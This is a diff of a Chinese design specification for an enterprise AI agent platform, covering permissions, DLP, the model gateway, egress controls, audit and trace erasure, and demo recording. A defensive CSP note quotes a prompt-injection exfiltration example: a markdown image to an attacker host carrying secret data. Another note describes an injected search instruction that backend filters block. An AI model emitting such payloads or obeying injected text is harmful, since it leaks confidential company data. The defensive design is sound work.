@@ -78,7 +78,7 @@ MCP 服务器 corpai/mcp_servers/<domain>     │
 | `corpai/db/migrate.py`、`migrations/000`、`migrations/020` | **核心（冻结）** | `apply_migrations(conn) -> list[str]` |
 | `migrations/001_a1_audit_log.sql`、`migrations/002_a1_trace_spans.sql` | A1 数据库 | — |
 | `corpai/audit/` | A1 数据库 | `record`、`arecord`、`record_owner_job`、`read_log`、`verify_chain`、`verify_chain_sql`、`read_anchors`、`write_anchor`、`AnchorError`、`EVENTS` |
-| `corpai/trace/` | A1 数据库 | `tracer.span(...)`、`Tracer`、`read_run`、`read_meta`、`dept_stats` |
+| `corpai/trace/`、`migrations/103_wrapup_trace_subjects.sql` | A1 数据库 | `tracer.span(...)`、`Tracer`、`read_run`、`read_meta`、`dept_stats`；只有表主人能调用：`trace.erase_subject`（SQL，§9） |
 | `corpai/classify/`、`config/sources.yaml` | A2 分级 | `classify_text`、`source_default`、`scrub_secrets`、`dlp_scan`、`mask_for_level`、`redact_protected`、`load_gazetteer(_from_db)`、`gazetteer_size`、`GazetteerError` |
 | `corpai/identity/`、`migrations/021_a3_sessions.sql`、`migrations/022_a3_personas.sql`、`config/agents.yaml` | A3 身份 | `directory.get_principal(_sync)`、`directory.list_personas(_sync)`、`groups.effective_groups`、`tokens.*` |
 | `corpai/policy/` | A3 身份 | `decide`、`rag_filter`、`tool_allowed`、`can_approve`、`ProposalView`、`RagFilter`、`may_start`、`apps_for`、`tool_tier` |
@@ -92,13 +92,13 @@ MCP 服务器 corpai/mcp_servers/<domain>     │
 | `corpai/sales/` | M4 销售 | `extract_profile_with_meta`/`extract_profile`、`intent_score`、`fit_score`、`tier`、`select_playbook`、`backtest` |
 | `corpai/hr/`、`migrations/090_m4_hr_screening.sql`、`migrations/091_m4_hr_headcount.sql` | M4 HR | `screen_candidate`、`record_decision`、`headcount_summary`、`prepare_resume` |
 | `corpai/agents/runtime.py`、`corpai/agents/router.py`、`corpai/agents/qa.py` | B3 图 | `RunContext`、`Services`、`BaseState`、`Step`、`node`（`@node(caps=..., gate=...)`）、`llm`、`llm_update`、`call_tool`、`retrieve`、`approval_gate`、`raise_hwm`、`current_hwm`、`published`/`PublicText` |
-| `corpai/agents/_runner.py`、`_threads.py`、`_checkpoint.py`、`_gazetteer.py`、`_rule_of_two.py`、`corpai/cli/serve.py`、`corpai/cli/prune.py`、`migrations/100_b3_threads.sql` … `102_b3_trace_min_group.sql` | B3 图 | 内部模块 |
+| `corpai/agents/_runner.py`、`_threads.py`、`_checkpoint.py`、`_gazetteer.py`、`_rule_of_two.py`、`corpai/cli/serve.py`、`corpai/cli/prune.py`、`corpai/cli/demo_record.py`、`migrations/100_b3_threads.sql` … `102_b3_trace_min_group.sql` | B3 图 | 内部模块 |
 | `corpai/agents/legal/`、`corpai/agents/report/`、`corpai/agents/sales/`、`corpai/agents/hr/` | M2 / M3 / M4 | 法务、报告：`build_graph()` + `initial_state`；销售：`build_sales_profile_graph()`、`build_sales_web_graph()`、`sales_profile_initial_state`；HR：`build_hr_headcount_graph()`、`build_hr_screening_graph()`、`build_hr_candidates_graph()` + `hr_<app>_initial_state`（路由的命名约定，§12） |
 | `corpai/playbooks/`、`playbooks/*.yaml` | B3 图 | `load_playbook(id)` |
 | `corpai/api/` | B3 图（各里程碑在自己的 `routes_<x>.py` 里加路由） | `create_app()` |
 | `ui/` | B4 界面 | 静态文件 |
 | `tests/<area>/`、`evals/<usecase>/` | 负责该领域的开发流；`tests/integration/` 放跨开发流的约定测试 | — |
-| `compliance/`、`docs/` | 文档流 | — |
+| `compliance/`、`docs/` | 文档流 | —（配套文档见 §17） |
 
 命令行：`python -m corpai <命令> [参数]` 分派到 `corpai/cli/<命令>.py`（命令名里的短横线换成下划线；每个模块提供 `main(argv) -> int`；不带参数时列出所有命令）。目前有：
 - `db up|down|status|reset --yes`（reset 还会把审计锚点文件改名存档，§9）；
@@ -106,7 +106,8 @@ MCP 服务器 corpai/mcp_servers/<domain>     │
 - `ingest [--corpus-dir DIR]`；
 - `metrics refresh|sign|publish|list|show`（演示和运维用的辅助命令；`--as <演示身份|user_id>` 只在演示登录开启时可用，每次使用都写审计 `demo_login`，动作 `cli_impersonation`）；
 - `prune [--days N]`（按期限清理 LangGraph checkpoint，后台任务 `prune`）；
-- `serve [--host 127.0.0.1] [--port 8000] [--allow-network-demo-login]`（API、MCP 服务器和界面在同一个进程里，跑在 SelectorEventLoop 上；演示登录开启时拒绝监听非本机地址，除非显式加这个参数）。
+- `serve [--host 127.0.0.1] [--port 8000] [--allow-network-demo-login]`（API、MCP 服务器和界面在同一个进程里，跑在 SelectorEventLoop 上；演示登录开启时拒绝监听非本机地址，除非显式加这个参数）；
+- `demo-record [--only report,legal,sales,hr,qa] [--small] [--daily-tokens N] [--out-dir DIR]`（通过进程内的 API 跑真实的运行，录制 `ui/fixtures/*.js`，§14；自己在 `.data/record/<pid>` 下起 Postgres；用哪种模型由 `CORPAI_LLM` 决定，实时模式没有 key 时拒绝启动）。
 
 💡 这样划分是为了让多个编程代理能**同时**开发而不互相踩文件。冻结的核心是所有人共用的“接口约定”，改动成本最高，所以先写好、测好，再并行开发。
 
@@ -176,6 +177,7 @@ class ToolTier(IntEnum):     READ = 1; INTERNAL = 2; EXTERNAL = 3       # 工具
 | `CORPAI_API_BASE` | `http://127.0.0.1:8000` | MCP 服务器和网关的地址 |
 | `CORPAI_SIM_TODAY` | `2026-10-01` | 模拟日期 |
 | `CORPAI_CHECKPOINT_TTL_DAYS` | `30` | 会话闲置多少天后，`python -m corpai prune` 删除它的 LangGraph checkpoint（`settings().checkpoint_ttl_days`；不是整数或小于 1 时按 30） |
+| `CORPAI_ALLOWED_HOSTS` | 空 | 除回环地址、`CORPAI_API_BASE` 的主机名和 `serve --host` 之外，API 还回答的主机名，逗号分隔（`corpai/api/security.py` 的 `HostCheck`：其他 `Host` 返回 400，跨源的写请求返回 403） |
 
 `CORPAI_LLM` 或 `CORPAI_EMBED` 的值不认识时，`settings()` 抛 `ValueError`。
 
@@ -453,7 +455,7 @@ def may_start(p, agent) -> Decision;  def apps_for(p) -> list[str];  def tool_ti
 
 💡 取两者中较高的，是为了防止提议把风险档 3 的工具报成风险档 2，让请求人自己批准自己，绕过四眼。
 
-设计评审第五节的权限矩阵就是验收测试：`tests/security/permission_matrix.yaml` 逐条列出“（演示身份，动作，资源）→ 允许 / 拒绝 [+ 字段屏蔽]”；`tests/security/test_permission_matrix.py` 检查 `decide()`，`tests/security/test_permission_matrix_rls.py` 在生成的数据上检查 RLS 给出同样的结果。两者必须一致。
+设计评审第五节的权限矩阵就是验收测试：`tests/security/permission_matrix.yaml` 逐条列出“（演示身份，动作，资源）→ 允许 / 拒绝 [+ 字段屏蔽]”；`tests/security/test_permission_matrix.py` 检查 `decide()`，`tests/security/test_permission_matrix_rls.py` 在生成的数据上检查 RLS 给出同样的结果。两者必须一致。生成的数据里没有 `hr.screenings` 的行（筛查决定是人做的），所以 `tests/hr/test_screenings_rls.py` 先用 `corpai.hr.record_decision` 写入真实的决定，再对每个演示身份、服务账号和用人经理比对 `decide()` 和 RLS（问题记录 D-08）。
 
 **`rag_filter` 的用途（purpose）**：
 - `qa`：`public`、`general`、`legal_regs`，加上本部门的集合；
@@ -467,8 +469,8 @@ def may_start(p, agent) -> Decision;  def apps_for(p) -> list[str];  def tool_ti
 
 💡 检索的过滤条件由后端按身份和用途生成，**不由模型生成**。比如一个销售用问答（qa）功能时，模型就算被注入了“去搜一下财务报表”，过滤条件里也根本没有财务集合；即使在包含财务集合的用途里（如 report），级别和 ACL 组条件也照样生效。
 
-待后续阶段（B/M）处理：
-- 还没有 Agent 持有 `code.create_ticket`/`code.comment_ticket`；要做工单 Agent，得在 `agents.yaml` 里加一项（B3 或某个里程碑）。
+没有做的（问题记录 D-06/D-16）：
+- 没有 Agent 持有 `code.create_ticket`、`code.comment_ticket` 和 `finance.post_journal_entry`。它们的服务器、执行器和工具规则都在，要做工单或财务 Agent，得在 `agents.yaml` 里加一项。`tests/policy/test_policy_props.py::test_unheld_write_tools_are_exactly_the_known_ones` 把这三个固定下来：让某个 Agent 持有其中之一，或者又多出一个没人持有的写工具，都必须是有意的改动。
 
 ## 7. 数据分级与 DLP（A2）
 
@@ -488,8 +490,8 @@ def mask_for_level(text: str, level: Level | int) -> str | None
     # 实际级别 = max(level, classify_text(text).level)：<= L2 原样返回；L3 → 每个 L3 及以上的片段换成 "⟨kind⟩"，
     # 再执行 scrub_secrets；L4、级别不合法或 text 为 None → None
 def redact_protected(text: str) -> tuple[str, list[Finding]]
-    # 筛选前处理简历（D6，支持英、德、中）：命中的片段换成 "⟨removed:<kind>⟩"。种类：照片、性别（包括称谓和英文代词）、
-    # 年龄、出生日期、族裔、国籍、籍贯出身、婚姻状况、子女、宗教、健康、残障
+    # 筛选前处理简历（D6，支持英、德、中、瑞典文）：命中的片段换成 "⟨removed:<kind>⟩"。种类：照片、性别（包括称谓和
+    # 英文、瑞典文代词）、年龄、出生日期、族裔、国籍、籍贯出身、婚姻状况、子女、宗教、健康、残障、性取向、跨性别身份
 def set_gazetteer(names) -> int;  def gazetteer_size() -> int
 def load_gazetteer(conn) -> int;  def load_gazetteer_from_db() -> int   # 用表主人连接；失败抛 GazetteerError
 ```
@@ -555,7 +557,7 @@ def get_gateway() -> ModelGateway   # 按 CORPAI_LLM 模式返回进程级单例
 5. 只对 `external`：对消息和工具定义执行 `dlp_scan`；被拦截 → 改走 `local`，理由 `dlp_upgrade`，并记下 DLP 判出的级别（第 2 步只给消息分级，DLP 还会扫工具定义，所以这一步拦下的通常是工具定义里的敏感内容）。然后不管哪条线路，按这个顺序：(a) 清除密钥后分类仍然发现 `secret` → 抛 `SecretDetected`（收尾记录 `model_call` deny `secret_unscrubbed`，没有 `route_decision` 记录）；(b) 理由不是 `route_by_level` 时写 `route_decision` 记录（decision `reroute`）；(c) 最终线路是 `local` 而 `local_down` 打开 → 抛 `LocalUnavailable`（`model_call` deny `local_down`）；(d) 查出口清单（`check_egress(线路的目的地, base_url, level)`，fake 模式也查；被拒绝时抛 `EgressDenied`，`model_call` deny `egress_denied`）。之后才打开 `llm` trace span，进入第 6 步等并发名额。
 6. 并发：每个事件循环里每条线路一个 `asyncio.Semaphore(max_concurrency)`；最多等 `queue_timeout_s`，超时抛 `GatewayBusy`。拿到名额之后、以及每次重试之前，**都再读一次开关**：`local_down` → `LocalUnavailable`；外部调用碰上 `external_down` → `ExternalUnavailable`（这时不再改线路，由调用方重试）。
 7. 预算：按部门、按 **UTC 自然日**计（`ops.budget_day()`，在 SQL 里决定；不用模拟日期）。在 `principal_tx` 里用 `ops.consume_budget(dept, tokens) -> (remaining, reservation_id)` 预留 `len(文本)/4 + 1 + max_tokens` 个 token（`dept` 必须等于 `app.dept`）；`remaining < 0` 表示什么也没预留 → `BudgetExceeded`。外部调用的 `ops.egress_log` 记录在**发送之前**、在同一个事务里写入；写不进去就不发送。调用结束后，`ops.settle_budget(reservation_id, actual)` 把预留换成实际用量（失败或取消时 `actual = 0`）：只有预留的那个用户能结算，只能结算一次，退回的量不超过预留量（`ops.budget_reservations`）。
-8. 调用后端（`live` 模式用 `OpenAICompatBackend`，`fake` 模式用 `FakeLLM`；`fake` 是默认模式，测试和离线演示都用它），每次尝试有 `timeout_s` 超时；遇到 429/5xx、超时和连接错误按指数退避重试（`retry`：最多 3 次，间隔 = min(8 秒, 0.5 秒 × 2^(第几次−1))）；其他 HTTP 状态码和后端的意外异常直接按 `BackendError` 失败，不重试；live 客户端不跟随重定向。
+8. 调用后端（`live` 模式用 `OpenAICompatBackend`，`fake` 模式用 `FakeLLM`；`fake` 是默认模式，测试用它（离线演示回放的是实时录制，见 §14）），每次尝试有 `timeout_s` 超时；遇到 429/5xx、超时和连接错误按指数退避重试（`retry`：最多 3 次，间隔 = min(8 秒, 0.5 秒 × 2^(第几次−1))）；其他 HTTP 状态码和后端的意外异常直接按 `BackendError` 失败，不重试；live 客户端不跟随重定向。
 9. 审计和 trace。每次通过请求校验的 `chat()` 恰好写一条收尾的 `model_call` 记录（decision 是 `allow`/`deny`/`error`；理由是 `route_by_level`、`gazetteer_unloaded`、`external_down_fallback`、`dlp_upgrade`、`secret_unscrubbed`、`local_down`、`external_down`、`gateway_busy`、`egress_denied`、`backend_error`、`cancelled` 之一），预算不足时改写一条 `budget_exceeded`。例外：在等并发名额时被取消，打开 `llm` span 时 trace 写入失败（这发生在等名额和预算之前），或者 `ops.get_switches`/`ops.reserve_and_log`/`ops.settle` 抛出数据库错误（即使后端调用已经成功），都不会留下收尾记录。理由不是 `route_by_level` 时，前面还有一条 `route_decision` 记录（decision `reroute`；因 `secret_unscrubbed` 拒绝时没有）。审计详情只放元数据（hwm、内容级别、检测到的种类、清除了几处密钥、用量、耗时、尝试次数、`egress_id`），从不放消息原文。整个调用包在一个按级别脱敏的 `llm` trace span 里。调用被取消（`CancelledError`）时，会执行一段受保护（shield，不会被再次取消）的清理：退回预留，并写一条带 `egress_id` 的 `model_call`（`error/cancelled`）。
 
 💡 **排队之后为什么要再读开关**：一个 local 请求可能在队列里等上 20 秒（external 最多等 5 秒），这期间管理员也许已经打开了“本地宕机”或“外部宕机”开关。只在开头读一次的话，排队中的请求照样会发出去。
@@ -587,7 +589,7 @@ max_tokens_cap: 4096
 
 **OpenAI 兼容接口**：`corpai.gateway.openai_compat.router`，提供 `POST /v1/chat/completions`，用网关令牌（`mint_gateway_token`）作为 Bearer key 认证。用户身份从目录重新读取（已停用 → 401）；令牌的任何问题都返回同一个 401 响应体。令牌里的 `floor` 就是这次调用的 `hwm`，`purpose = "compat.<agent>"`，请求体里的 `model` 被忽略。`stream=true` 直接返回 400。错误码：400 请求体不对或 `secret_detected`；413 请求体超过 4 MiB；`chat()` 抛 `PermissionError` 时返回 401（和令牌无效时同一个响应体）；503 `local_unavailable`（Retry-After 60）、`external_unavailable` 和 `gateway_busy`（Retry-After 5）；429 `budget_exceeded`；502 `backend_error`，其他网关错误（如 `EgressDenied`、`MissingApiKey`）返回 502 `gateway_error`。响应是 OpenAI 格式，外加一个键 `"corpai": {route, level, audit_seq}`。如果 `app.state.gateway` 上设了网关，就用它代替 `get_gateway()`。法务审查图不走这个接口：`corpai.legal.review_contract` 用 `Settings(mode="gateway")` 和 `corpai.legal.GatewayBackend` 运行 Clause Check，在进程内直接调用 `ModelGateway.chat`（purpose `legal.review`，hwm 至少 L3）。这个接口给持有网关令牌的 OpenAI SDK 客户端用，例如随项目带进来的 Clause Check 的可选 `local` 模式，它的 `OpenAICompatBackend` 不用改代码（假模型应答 `compat.legal_review`，`register_compat_responder`；`tests/legal/test_compat.py`）。目前平台代码里没有任何地方签发网关令牌。
 
-**出口清单** `config/egress.yaml`（`destinations:` 下每项有 `kind`（`http` | `in_process` | `simulated`）、`hosts`、`max_level`）：`model.external`（http，`api.deepseek.com`，L2）、`model.local`（http，`api.deepseek.com`，L4，模拟内网）、`search.mock`（进程内，L1）、`email.outbox`（模拟发件箱，`max_level: null`：不接受模型数据）。`egress.check_egress(destination, url, level)` 遇到以下情况抛 `EgressDenied`：目的地不在清单里、主机不在它的 `hosts` 里、URL 不是 https、级别超过 `max_level`。live 后端的 HTTP 客户端对每个请求（包括重定向）都再查一次主机。`ops.egress_log` 拒绝级别高于 L2 的 external 记录（表的 CHECK 约束和 `ops.log_egress` 各查一次）。有一个测试扫描 `corpai/` 和 `config/` 里写死的主机名，出现清单外的主机就失败。
+**出口清单** `config/egress.yaml`（`destinations:` 下每项有 `kind`（`http` | `in_process` | `simulated`）、`hosts`、`max_level`）：`model.external`（http，`api.deepseek.com`，L2）、`model.local`（http，`api.deepseek.com`，L4，模拟内网）、`search.mock`（进程内，L1）、`email.outbox`（模拟发件箱，`max_level: null`：不接受模型数据）、`embed.model_download`（http，`huggingface.co`，`max_level: null`：可选，只在 `CORPAI_EMBED=fastembed` 时由 fastembed 自己第一次下载模型到 `cache_dir/fastembed`；不发送任何数据，也不经过 `check_egress`；不能上网的部署事先拷好缓存并设 `HF_HUB_OFFLINE=1`，问题记录 D-17）。`egress.check_egress(destination, url, level)` 遇到以下情况抛 `EgressDenied`：目的地不在清单里、主机不在它的 `hosts` 里、URL 不是 https、级别超过 `max_level`。live 后端的 HTTP 客户端对每个请求（包括重定向）都再查一次主机。`ops.egress_log` 拒绝级别高于 L2 的 external 记录（表的 CHECK 约束和 `ops.log_egress` 各查一次）。有一个测试扫描 `corpai/` 和 `config/` 里写死的主机名，出现清单外的主机就失败。
 
 ## 9. 审计与 trace（A1）
 
@@ -632,7 +634,7 @@ def read_anchors(path=None) -> list[Anchor];  def write_anchor(conn=None, *, pat
 
 💡 签核和人工决定以前混在 `policy_decision`、`tool_call` 里，审计员要从一堆策略判断里把“人做的决定”挑出来。单独的事件名让“谁签了哪个数字、谁对哪个候选人做了什么决定”一查就有，这正是 GDPR 第 22 条和指标签核要能回答的问题。
 
-trace 表 `trace.spans`：`span_id, run_id, parent_id, name, kind（node|llm|tool|retrieval|policy）, user_id, dept, level, started_at, ended_at, status（running|ok|error）, attrs jsonb, input_text, output_text`；CHECK 约束禁止 L4 的 span 带任何文本。唯一的写入途径是 `trace.write_span(...)`（SECURITY DEFINER）：span 属于谁取自 `app.user_id`/`app.dept`，不由参数指定；span 开始时只插入元数据，结束时更新一次；它的身份和主人永远不变，级别只升不降，结束后就冻结；attrs 里出现凭据类字段名直接拒绝。`Span.set_attr`（Python 一侧，不是 `trace.write_span`）限制 attrs 每项的值不超过 4096 字节的 JSON、键不超过 64 个字符。
+trace 表 `trace.spans`：`span_id, run_id, parent_id, name, kind（node|llm|tool|retrieval|policy）, user_id, dept, level, started_at, ended_at, status（running|ok|error）, attrs jsonb, input_text, output_text, subject_ids text[]`；CHECK 约束禁止 L4 的 span 带任何文本。唯一的写入途径是 `trace.write_span(...)`（SECURITY DEFINER）：span 属于谁取自 `app.user_id`/`app.dept`，不由参数指定；span 开始时只插入元数据，结束时更新一次；它的身份和主人永远不变，级别只升不降，结束后就冻结；attrs 里出现凭据类字段名直接拒绝。`Span.set_attr`（Python 一侧，不是 `trace.write_span`）限制 attrs 每项的值不超过 4096 字节的 JSON、键不超过 64 个字符。
 
 **脱敏只在 span 结束时做一次**，用 span 最终的级别：`default_masker` = 先 `scrub_secrets` 再 `mask_for_level`；L4 的文本一律丢弃；脱敏函数抛异常或返回的不是字符串时，一个字也不存，并记 `attrs.masking_failed`；`default_masker` 自己在 `corpai.classify` 导入失败或出错时返回 `None`，也是一个字不存，但不记这个标记（fail-closed）。出错的 span 状态设为 `error`，只记异常的类名（`attrs.error_type`），然后把异常继续抛出。成功的 span 在结束时写入失败的话，只记日志（类名）不抛异常，这个 span 保持 `running`。
 
@@ -656,7 +658,7 @@ async def dept_stats(principal: Principal, since: datetime) -> list[dict]   # �
 💡 **审计和 trace 为什么分开**：trace 是给工程师排查问题的，可以脱敏、可以过期删除；审计是给合规和安全看的，要回答“谁、以谁的身份、通过哪个 Agent、看了什么、谁批准的”，而且不能被篡改。如果把 trace 当审计用，能看 trace 的人就成了全公司权限最高的人（设计评审 二.11）。同样的道理，trace 的统计也按“负责人只看本部门”这一条规则给，CEO 不开特例：设计评审第五节的权限矩阵里，“trace 内容”这一行的 CEO 一栏就是“否”。
 
 平台服务阶段已完成：`audit_read` 事件；`dept_stats` 的最小分组（每行至少 5 个 span、至少 5 个不同的人，迁移 102）。
-仍待处理（问题记录 D-04）：`trace.spans` 加上 `subject_ids`，支持 GDPR 删除个人数据。
+收尾阶段已做（迁移 103，问题记录 D-04）：`trace.spans.subject_ids`。`call_tool` 记下工具返回的行的 `label.subject_ids`（MCP 结果的 label 现在带这一项），`retrieve` 记下保留下来的检索结果的 `Hit.subject_ids`，都经 `Span.add_subjects`（只收行编号，最多 500 个，只增不减；`trace.write_span` 多了第 13 个参数 `p_subject_ids`）。读 trace 的函数都不返回它。`trace.erase_subject(subject_id)`（只有表主人能调用，用于 GDPR 删除请求）找到读过这个人的 span 所在的会话（`ops.thread_runs`），把这些会话里每次运行的每个 span 的输入、输出文本和这个编号清掉，并标上 `attrs.erased`。直接查库的领域函数（销售意向分、指标读取）不记录：它们的 span 里只有分数或汇总，L4 的 span 本来就不存文本。
 
 ## 10. RAG（B1）
 
@@ -708,7 +710,7 @@ ctx_auth = await authenticate(ctx, domain="crm", tool="get_account")
 然后对具体资源调用 `policy.decide()`，在 `principal_tx` 里查询，返回统一格式的结果**信封**（envelope：数据外面再包一层，附上标签、被拒绝的行和被屏蔽的字段）：
 
 ```json
-{"ok": true, "data": {...}, "label": {"level": 3, "dept": "sales", "trust": "internal", "sources": ["crm.account:A-0012"]},
+{"ok": true, "data": {...}, "label": {"level": 3, "dept": "sales", "trust": "internal", "sources": ["crm.account:A-0012"], "subject_ids": ["CT-00031"]},
  "denied": [], "masked_fields": [], "error": null}
 ```
 
@@ -841,13 +843,13 @@ Agent 白名单在 `config/agents.yaml`：`agents:` 下每个 Agent 有 `descrip
 | GET/POST | `/api/admin/switches` | 平台管理员：`local_down`、`external_down`，经 `gateway.ops.get_switches()`（{local_down, external_down}；没有 `local_down` 这一行时按“打开”处理）/ `set_switch(principal, name, on, reason)`（改动和 Python 一侧的拒绝写审计 `outage_switch`；开关名或理由不对直接抛 `ValueError`，不写审计，对管理员返回 400，对其他人返回 403；被 `ops.set_switch` 的 SQL 检查拒绝时变成 `PermissionError`，不写 deny 记录） |
 | POST | `/v1/chat/completions` | OpenAI 兼容的网关接口（网关令牌），`corpai.gateway.openai_compat.router` |
 | — | `/mcp/<domain>/mcp` | MCP 服务器 |
-| GET | `/` | 界面（实时模式）；`ui/fixtures/` 下的一律 404，响应都带 `Cache-Control: no-store`；每个响应都带 CSP、`nosniff`、`Referrer-Policy: no-referrer`、`X-Frame-Options: DENY` |
+| GET | `/` | 界面（实时模式）；`ui/fixtures/` 下的一律 404，响应都带 `Cache-Control: no-store`；每个响应都带 CSP、`nosniff`、`Referrer-Policy: no-referrer`、`X-Frame-Options: DENY`；所有路径只回答 `Host` 是回环地址、`CORPAI_API_BASE` 的主机名、`serve --host` 或 `CORPAI_ALLOWED_HOSTS` 里的名称的请求（否则 400），带外来 `Origin` 的非 GET 请求返回 403 |
 
 各里程碑的路由写在 `corpai/api/routes_<area>.py`：`create_app()` 用 `pkgutil` 找出每个导出了 `router` 的 `corpai/api/routes_<area>.py`，统一挂载。API 启动（lifespan）时：启动或连上 Postgres 并执行迁移；装上应用连接池（`pg.install_app_pool`）；加载人名词典（§7；失败时 fail-closed）；把崩溃时停在 `approved` 的提议标为 `failed`（`proposals.fail_interrupted`）；以表主人身份建好 `lg` 的 checkpoint 表（§12）；构造 `Services(gateway, McpClient(asgi_app=app), tracer)`；运行各 MCP 服务器的 session manager。
 
 各里程碑的路由先检查调用者，再以调用者的身份读取：
-- `/api/sales/*` 和 `/api/hr/*` 调用 `router.resolve(p, app)`：调用者不能启动这个应用时返回 403 `forbidden`，和 POST /api/runs 一样不写审计（问题记录 WR-10）。销售和 HR 候选人的读取以该应用的 Agent 身份经 `McpClient` 进行，所以工具规则 ∩ Agent 白名单 ∩ 只含一个工具的令牌 ∩ RLS 全都生效，工具服务器也会为每次调用写审计。
-- `/api/legal/*` 检查 `may_start(legal_review)`（拒绝时写审计 `policy_decision`），在 `principal_tx` 里直接读 `legal.contracts` / `legal.reviews`（RLS 生效），不经过 MCP 工具（问题记录 WR-11）。
+- `/api/sales/*` 和 `/api/hr/*` 调用 `deps.require_app(p, app, action=...)`（`router.resolve` 加审计）：调用者不能启动这个应用时返回 403 `forbidden`，并写审计 `policy_decision` deny（resource 为 `agent:<agent>`，reason 为规则编号）；POST /api/runs（action 为 `start`）和 HR 决定接口也一样（问题记录 WR-10）。销售和 HR 候选人的读取以该应用的 Agent 身份经 `McpClient` 进行，所以工具规则 ∩ Agent 白名单 ∩ 只含一个工具的令牌 ∩ RLS 全都生效，工具服务器也会为每次调用写审计。
+- `/api/legal/*` 检查 `may_start(legal_review)`（拒绝时写审计 `policy_decision`），在 `principal_tx` 里直接读 `legal.contracts` / `legal.reviews`（RLS 生效），不经过 MCP 工具；合同列表还要通过 `legal.search_contracts` 的工具规则；每次读取都写一条只含元数据的 `retrieval` 审计（action 为 `legal.list_contracts` / `legal.list_reviews` / `legal.get_review`：编号、数量、最高级别；不存在或看不到的审查记一条 deny）（问题记录 WR-11）。
 - `/api/reports/*/export` 检查 `router.resolve(p, "report")`，读调用者自己的 checkpoint；拒绝时写审计 `export` deny。
 - `/api/metrics*` 不检查应用：停用账号和平台角色返回 403；其他人经 `corpai.metrics` 读取 RLS 和逐行 `decide()` 允许他看的内容；只有财务负责人能签核、发布和刷新。签核和发布由 `corpai.metrics` 写审计，刷新尝试写 `policy_decision`。
 
@@ -879,8 +881,10 @@ Agent 白名单在 `config/agents.yaml`：`agents:` 下每个 Agent 有 `descrip
   - 法务审查（`#/legal`）、管理层报告（`#/report`）、指标签核（`#/metrics`）、销售画像（`#/sales`）、HR 筛选（`#/hr`）、编制（`#/headcount`）、候选人（`#/candidates`）；
   - trace 查看、审计日志查看、管理员开关；
   - “同一个问题，不同的人问”对比页。
-  - 报告页的默认请求是当前界面语言的 `report_default_input`（“2026-Q3 管理层报告” / “2026-Q3 management report”）。报告用输入的语言写（`agents/report/request.py`），所以默认报告跟着界面语言走；演示录制按期间匹配，换成本地化的默认值仍能找到 2026-Q3 的录制。
-- 假模型提示：演示录制都是用离线的 FakeLLM 做的（问题记录 D-07）。`C.fakeModelNote(run)`（`js/components.js`）在以 `[fake/` 开头的模型文本旁边，以及演示模式下每个调用过模型的运行旁边，显示 `fake_model_note` 提示；运行卡片、报告正文、销售策略和编制说明（`note_source` 为 `code` 时除外）都用它。`tests/ui/test_static.py` 里有 `REAL_RECORDINGS = False`：为 false 时，fixture 里必须还有 `[fake/`，这四个页面也必须调用 `fakeModelNote`；用真实模型重新录制后改成 `True`，之后任何 fixture 里都不能再出现 `[fake/`。
+  - 报告页的默认请求是当前界面语言的 `report_default_input`（“2026-Q3 管理层报告” / “2026-Q3 management report”）。报告用输入的语言写（`agents/report/request.py`），所以默认报告跟着界面语言走；每个管理层身份的报告都录了中文和英文两份，`demo_report.js` 先按期间找，再按输入的语言（和 `request.py` 同一条规则）挑，找不到就按界面语言，再找不到取任意一份。
+  - 平台管理员和安全审计员的导航里没有 `#/metrics`（路由字段 `notRoles`；首页的卡片也锁上），直接打开页面仍会明确拒绝。
+  - 标签页（法务、审批）用 `C.tabs`：WAI-ARIA 标签页模式，手动激活，支持方向键和 Home/End，页面重新渲染后焦点回到选中的标签。
+- 演示录制：`python -m corpai demo-record`（§2）在进程内以各个身份调用真实的 API，写出 `fixtures/report.js`、`legal.js`、`sales.js`、`hr.js`，录 `qa` 时写 `runs.js`、`traces.js` 和 `audit.js`（`proposals.js`、`compare.js` 是手写的，里面没有模型文字）。每个录制文件带 `recorded: {mode, model, on, company, seed}`；文件里有金丝雀，或者实时录制里出现 `[fake/` 文字时，录制器拒绝写出。共用的问答示例（身份 `*`，所有身份都能看到）以平台管理员的身份录制，他的问答只看得到全公司可读的集合；检索、调用或读取了别的内容时录制器拒绝写出，也不保存它的 trace；`demo.js` 从不提供 `*` 运行的 trace（问题记录 SEC-1）。现在的 fixtures 是 2026-10-08 用真实 DeepSeek 模型、完整规模公司（种子 7）录的（问题记录 D-07、WR-06）。`C.fakeModelNote(run)`（`js/components.js`）在以 `[fake/` 开头的模型文本旁边显示 `fake_model_note`；演示模式下，其他调用过模型的运行旁边显示 `demo_recorded_note`（真实模型的录制，带日期）。运行卡片、报告正文、销售策略和编制说明（`note_source` 为 `code` 时除外）都用它，页脚也写明录制日期。`tests/ui/test_static.py` 里 `REAL_RECORDINGS = True`：任何 fixture 里都不能有 `[fake/`，每个录制文件都必须标着 `mode: live` 和 `models.yaml` 里的模型，提示和页脚里的日期必须和标记一致；所以换一天重新录制，要同时改 `i18n.js` 里的这几处文字。
 - 用 CSP meta 限制资源来源：`default-src 'self'; img-src 'self' data:; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' http://127.0.0.1:8000`。外部链接显示完整 URL，点击前要确认。
 
 💡 `img-src 'self' data:` 禁止加载外部图片，用来堵一种隐蔽的数据外带：被注入的模型输出一个 `![](https://攻击者.com/?data=机密)`，浏览器一渲染就把数据发出去了。
@@ -931,9 +935,9 @@ Agent 白名单在 `config/agents.yaml`：`agents:` 下每个 Agent 有 `descrip
 
 | | 图 | 关键检查 |
 |---|---|---|
-| M1 | `agents/qa.py`：分级 → 检索（用途 `qa`：public、general、legal_regs 和调用者本部门的集合。和问题没有任何共同实词（或中日韩字符二元组）的命中，在进入会话之前就丢掉。写给 AI 的段落被扣下，`_qa_guard.py`）→ 工具（最多 3 轮模型调用、每轮最多 4 次工具调用，只能从 qa Agent 的只读工具里选这个用户能用的；其他名字一律拒绝，并发出 `policy` `tool_not_offered` 事件；写给 AI 的工具结果会被标记）→ 回答 → 引用（代码只保留检索到的文档或工具来源的引用；L4 的引用不带摘录）。每次运行只有一个线路事件（回答那次调用的线路，也是最严格的） | 公开问题走 `external`；内部问题走 `local`；不同身份问同一个问题，返回的文档不同；打开宕机开关后 L3 请求报错，`external` 出口为 0。测试集：金丝雀、混沌、红队、路由样例（`tests/security`），黄金问题集（`evals/qa`），路由鲁棒性（`evals/routing`） |
